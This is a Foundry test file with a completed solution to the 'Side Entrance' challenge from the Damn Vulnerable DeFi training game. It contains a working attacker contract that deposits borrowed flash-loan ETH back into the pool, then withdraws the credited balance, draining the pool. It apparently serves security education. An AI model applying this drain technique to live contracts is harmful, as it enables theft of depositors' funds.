// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // Deploy the attack contract as the player
        AttackSideEntrance attacker = new AttackSideEntrance(
            address(pool),
            recovery
        );

        // Exploit the pool in a single call
        attacker.pwnFlashLoan(ETHER_IN_POOL);
    }

    function execute() external payable {
        // Deposit the flash loan amount into the pool
        pool.deposit{value: msg.value}();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(
            recovery.balance,
            ETHER_IN_POOL,
            "Not enough ETH in recovery account"
        );
    }
}

/**
 * Attacker contract that requests the flashLoan,
 * implements the flashLoan callback (`execute`),
 * and withdraws then forwards stolen ETH to `recovery`.
 */
contract AttackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;
    address payable public recovery;

    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = payable(_recovery);
    }

    /**
     * Initiates the exploit in one go.
     */
    function pwnFlashLoan(uint256 amount) external {
        // 1) Request the flash loan from the pool
        pool.flashLoan(amount);

        // 2) Now that deposit credited our attacker contract, withdraw
        pool.withdraw();

        // 3) Send all ETH from here -> recovery
        // (bool sent, ) = recovery.call{value: address(this).balance}("");
        // require(sent, "ETH transfer failed");
        Address.sendValue(recovery, address(this).balance);
    }

    /**
     * Flash loan callback from the pool
     */
    function execute() external payable {
        // deposit the borrowed ETH back into the pool
        // this step repays the flash loan in pool's eyes
        pool.deposit{value: msg.value}();
    }

    // accept ETH from pool.withdraw()
    receive() external payable {}
}
